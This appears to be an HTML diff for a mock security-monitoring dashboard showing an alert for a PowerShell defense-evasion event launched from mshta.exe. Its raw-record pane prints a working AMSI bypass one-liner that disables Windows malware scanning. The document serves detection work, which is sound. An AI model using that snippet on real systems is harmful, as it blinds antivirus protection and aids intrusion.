+        <div style="display:flex;align-items:center;padding:0 10px;font:400 11.5px var(--ui);color:#8F99A8">Raw</div>
+        <div style="display:flex;align-items:center;gap:5px;padding:0 10px;font:400 11.5px var(--ui);color:#8F99A8">Related <span class="tag" style="background:#2F343C;color:#ABB3BF">6</span></div>
+      </div>
+
+      <div style="padding:10px 12px;border-bottom:1px solid rgba(255,255,255,.06);display:flex;flex-direction:column;gap:7px">
+        <div style="font:500 12.5px var(--ui);color:#F6F7F9;line-height:1.35">PowerShell script block patched the AMSI result buffer</div>
+        <div style="display:flex;gap:5px;flex-wrap:wrap">
+          <span class="tag" style="background:rgba(205,66,70,.2);color:#FA999C">CRITICAL</span>
+          <span class="tag" style="background:rgba(189,173,255,.14);color:#BDADFF">T1562.001</span>
+          <span class="tag mono" style="background:#2F343C;color:#ABB3BF">EDR-EVA-AMSI-001</span>
+        </div>
+      </div>
+
+      <div style="flex-grow:1;overflow:hidden;display:flex;flex-direction:column">
+        <div style="padding:9px 12px 4px" class="lbl">Normalized fields</div>
+        <div style="padding:0 12px;display:flex;flex-direction:column">
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">ts</span><span class="mono" style="font-size:11px;color:#C5CBD3">2026-03-14T13:14:41.402Z</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">host</span><span class="mono" style="font-size:11px;color:#C5CBD3">WIN-WKS14</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">os / source</span><span class="mono" style="font-size:11px;color:#C5CBD3">windows / powershell</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">event_id</span><span class="mono" style="font-size:11px;color:#C5CBD3">4104</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">category</span><span class="mono" style="font-size:11px;color:#C5CBD3">process</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">user</span><span class="mono" style="font-size:11px;color:#C5CBD3">CORP\jdoe</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">process.name</span><span class="mono" style="font-size:11px;color:#C5CBD3">powershell.exe</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">process.pid</span><span class="mono" style="font-size:11px;color:#C5CBD3">7220</span></div>
+          <div style="display:flex;gap:10px;padding:3px 0;border-bottom:1px solid rgba(255,255,255,.04)"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">process.ppid</span><span class="mono" style="font-size:11px;color:#C5CBD3">6104 <span style="color:#5F6B7C">(mshta.exe)</span></span></div>
+          <div style="display:flex;gap:10px;padding:3px 0"><span class="mono" style="width:118px;flex:none;font-size:11px;color:#738091">process.cmdline</span><span class="mono" style="font-size:11px;color:#C5CBD3;word-break:break-all">powershell.exe -nop -w hidden -enc SQBFAFgA…</span></div>
+        </div>
+
+        <div style="padding:11px 12px 4px" class="lbl">Raw record</div>
+        <div style="margin:0 12px;padding:9px 10px;background:#111418;border:1px solid #383E47;border-radius:2px;overflow:hidden">
+          <pre class="mono" style="margin:0;font-size:10.5px;line-height:1.55;color:#C5CBD3;white-space:pre-wrap;word-break:break-all"><span style="color:#8ABBFF">"EventID"</span>: <span style="color:#FBD065">4104</span>,
+<span style="color:#8ABBFF">"Channel"</span>: <span style="color:#72CA9B">"Microsoft-Windows-PowerShell/Operational"</span>,
+<span style="color:#8ABBFF">"ScriptBlockText"</span>: <span style="color:#72CA9B">"$a=[Ref].Assembly.GetType('System.Management.
+  Automation.AmsiUtils');$f=$a.GetField('amsiInitFailed',
+  'NonPublic,Static');$f.SetValue($null,$true)"</span>,
+<span style="color:#8ABBFF">"MessageNumber"</span>: <span style="color:#FBD065">1</span>,
+<span style="color:#8ABBFF">"Path"</span>: <span style="color:#5F6B7C">null</span></pre>
+        </div>
+      </div>
+
+      <div style="flex:none;border-top:1px solid #383E47;padding:9px 12px;display:flex;gap:8px">
+        <button class="btn btn-primary">Pivot: this process tree</button>
+        <button class="btn btn-min">Copy JSON</button>
+      </div>
+    </div>
+  </div>
+</div>
+</x-dc>
+</body>
+</html>
